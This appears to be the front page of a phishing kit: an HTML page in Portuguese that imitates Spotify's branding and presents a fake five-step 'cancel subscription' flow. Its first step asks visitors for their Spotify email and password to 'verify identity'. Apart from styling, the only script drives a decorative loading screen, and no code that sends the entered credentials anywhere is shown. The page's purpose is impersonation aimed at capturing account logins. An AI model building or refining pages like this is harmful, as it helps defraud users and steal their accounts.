<!DOCTYPE html>
<html lang="pt-BR">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Cancelar Assinatura - Spotify</title>

<style>
/* Loading Screen */
#loading-screen {
    position: fixed;
    top: 0;
    left: 0;
    width: 100%;
    height: 100%;
    background-color: #000;
    display: flex;
    flex-direction: column;
    justify-content: center;
    align-items: center;
    z-index: 9999;
    transition: opacity 0.5s ease-out;
}

#loading-screen.hidden {
    opacity: 0;
    visibility: hidden;
    pointer-events: none;
}

.loading-spinner {
    border: 4px solid rgba(255, 255, 255, 0.3);
    border-top: 4px solid #1ED760;
    border-radius: 50%;
    width: 50px;
    height: 50px;
    animation: spin 1s linear infinite;
}

.loading-logo {
    width: 120px;
    margin-top: 20px;
}

@keyframes spin {
    0% { transform: rotate(0deg); }
    100% { transform: rotate(360deg); }
}

/* Base Styles */
body {
    font-family: 'Inter', sans-serif;
    margin: 0;
    padding: 0;
    background-color: #121212;
    color: #fff;
    line-height: 1.6;
}

.container {
    max-width: 960px;
    margin: 0 auto;
    padding: 0 20px;
}

/* Header */
.header {
    background-color: #000;
    padding: 15px 0;
    border-bottom: 1px solid #282828;
}

.header .container {
    display: flex;
    align-items: center;
}

.logo {
    display: flex;
    align-items: center;
}

.logo-icon {
    width: 30px;
    height: 30px;
    margin-right: 10px;
    color: #1ED760;
}

.logo-text {
    font-size: 24px;
    font-weight: 700;
    color: #fff;
}

/* Progress Bar */
.progress-container {
    background-color: #282828;
    padding: 10px 0;
    border-bottom: 1px solid #333;
}

.progress-info {
    display: flex;
    justify-content: space-between;
    margin-bottom: 5px;
    font-size: 14px;
    color: #b3b3b3;
}

.progress-bar {
    background-color: #404040;
    height: 8px;
    border-radius: 4px;
    overflow: hidden;
}

.progress-fill {
    background-color: #1ED760;
    height: 100%;
    width: 0%;
    border-radius: 4px;
    transition: width 0.3s ease-in-out;
}

/* Main Content */
.main-content {
    padding: 40px 0;
}

.step {
    display: none;
}

.step.active {
    display: block;
}

.card {
    background-color: #282828;
    border-radius: 8px;
    box-shadow: 0 4px 15px rgba(0, 0, 0, 0.5);
    margin-bottom: 30px;
    overflow: hidden;
}

.card-header {
    background-color: #1a1a1a;
    padding: 25px;
    border-bottom: 1px solid #333;
}

.card-title {
    font-size: 28px;
    font-weight: 700;
    margin-top: 0;
    margin-bottom: 10px;
    color: #fff;
}

.card-description {
    font-size: 16px;
    color: #b3b3b3;
    margin-bottom: 0;
}

.card-content {
    padding: 25px;
}

/* Forms */
.form-group {
    margin-bottom: 20px;
}

.form-label {
    display: block;
    margin-bottom: 8px;
    font-size: 15px;
    font-weight: 500;
    color: #fff;
}

.form-input {
    width: 100%;
    padding: 12px;
    border: 1px solid #535353;
    border-radius: 4px;
    background-color: #333;
    color: #fff;
    font-size: 16px;
    box-sizing: border-box;
}

.form-input:focus {
    outline: none;
    border-color: #1ED760;
    box-shadow: 0 0 0 2px rgba(30, 215, 96, 0.5);
}

/* Buttons */
.btn {
    display: inline-block;
    padding: 12px 25px;
    border-radius: 50px;
    font-size: 16px;
    font-weight: 700;
    text-align: center;
    cursor: pointer;
    transition: all 0.3s ease;
    text-decoration: none;
}

.btn-primary {
    background-color: #1ED760;
    color: #fff;
    border: none;
}

.btn-primary:hover {
    background-color: #179b4a;
}

.btn-full {
    width: 100%;
    display: block;
}
</style>
</head>
<body>
    <div id="loading-screen">
        <div class="loading-spinner"></div>
        <img src="https://www.scdn.co/i/spotify-logo-png-white.png" alt="Spotify Logo" class="loading-logo">
    </div>
    
    <!-- Header -->
    <header class="header">
        <div class="container">
            <div class="logo">
                <svg class="logo-icon" viewBox="0 0 24 24" fill="currentColor">
                    <path d="M12 2C6.477 2 2 6.477 2 12s4.477 10 10 10 10-4.477 10-10S17.523 2 12 2zm4.586 14.424c-.18.295-.563.387-.857.207-2.348-1.435-5.304-1.76-8.785-.964-.335.077-.67-.133-.746-.47-.077-.334.132-.67.47-.746 3.809-.871 7.077-.496 9.713 1.115.293.18.386.563.206.858zm1.223-2.723c-.226.367-.706.482-1.073.257-2.687-1.652-6.785-2.131-9.965-1.166-.413.125-.849-.106-.973-.517-.125-.413.106-.849.517-.973 3.632-1.102 8.147-.568 11.238 1.327.366.226.482.707.256 1.072zm.105-2.835C14.692 8.95 9.375 8.775 6.297 9.71c-.493.15-1.016-.128-1.166-.62-.149-.493.129-1.016.621-1.166C9.04 7.347 14.964 7.548 18.505 9.73c.423.26.559.82.298 1.244-.26.424-.82.56-1.244.298z"/>
                </svg>
                <span class="logo-text">Spotify</span>
            </div>
        </div>
    </header>

    <!-- Progress Bar -->
    <div class="progress-container">
        <div class="container">
            <div class="progress-info">
                <span class="progress-text">Etapa <span id="current-step">1</span> de 5</span>
                <span class="progress-percentage"><span id="progress-percent">20</span>% concluído</span>
            </div>
            <div class="progress-bar">
                <div class="progress-fill" id="progress-fill"></div>
            </div>
        </div>
    </div>

    <!-- Main Content -->
    <main class="main-content">
        <div class="container">
            <div class="step active" id="step-1">
                <div class="card">
                    <div class="card-header">
                        <h1 class="card-title">Faça login na sua conta</h1>
                        <p class="card-description">Para cancelar sua assinatura, precisamos verificar sua identidade</p>
                    </div>
                    <div class="card-content">
                        <form id="login-form">
                            <div class="form-group">
                                <label for="email" class="form-label">Email</label>
                                <input type="email" id="email" class="form-input" placeholder="seu@email.com" required>
                            </div>
                            <div class="form-group">
                                <label for="password" class="form-label">Senha</label>
                                <input type="password" id="password" class="form-input" placeholder="••••••••" required>
                            </div>
                            <button type="submit" class="btn btn-primary btn-full">Continuar</button>
                        </form>
                    </div>
                </div>
            </div>
        </div>
    </main>

    <script>
        // Variáveis de controle da tela de carregamento
        let MIN_LOADING_TIME = 2000; // Tempo mínimo de carregamento em milissegundos (2 segundos)
        let loadStartTime;

        // Função para definir o tempo de carregamento
        function setLoadingTime(timeInMs) {
            MIN_LOADING_TIME = timeInMs;
            console.log('Tempo de carregamento definido para:', timeInMs + 'ms');
        }

        // Função para mostrar a tela de carregamento
        function showLoadingScreen() {
            const loadingScreen = document.getElementById('loading-screen');
            if (loadingScreen) {
                loadingScreen.classList.remove('hidden');
                loadStartTime = Date.now();
                console.log('Tela de carregamento exibida');
            }
        }

        // Função para esconder a tela de carregamento
        function hideLoadingScreen() {
            const loadingScreen = document.getElementById('loading-screen');
            if (loadingScreen && loadStartTime) {
                const elapsedTime = Date.now() - loadStartTime;
                const remainingTime = Math.max(0, MIN_LOADING_TIME - elapsedTime);
                
                setTimeout(() => {
                    loadingScreen.classList.add('hidden');
                    console.log('Tela de carregamento escondida após', MIN_LOADING_TIME + 'ms');
                }, remainingTime);
            }
        }

        // Inicialização quando a página carregar
        window.addEventListener('load', function() {
            loadStartTime = Date.now();
            console.log('Página carregada, iniciando timer de carregamento');
            
            // Esconder a tela de carregamento após o tempo definido
            setTimeout(() => {
                const loadingScreen = document.getElementById('loading-screen');
                if (loadingScreen) {
                    loadingScreen.classList.add('hidden');
                    console.log('Tela de carregamento escondida automaticamente');
                }
            }, MIN_LOADING_TIME);
        });

        // Garantir que a tela de carregamento seja visível inicialmente
        document.addEventListener('DOMContentLoaded', function() {
            const loadingScreen = document.getElementById('loading-screen');
            if (loadingScreen) {
                loadingScreen.classList.remove('hidden');
                console.log('Tela de carregamento inicializada');
            }
        });
    </script>
</body>
</html>
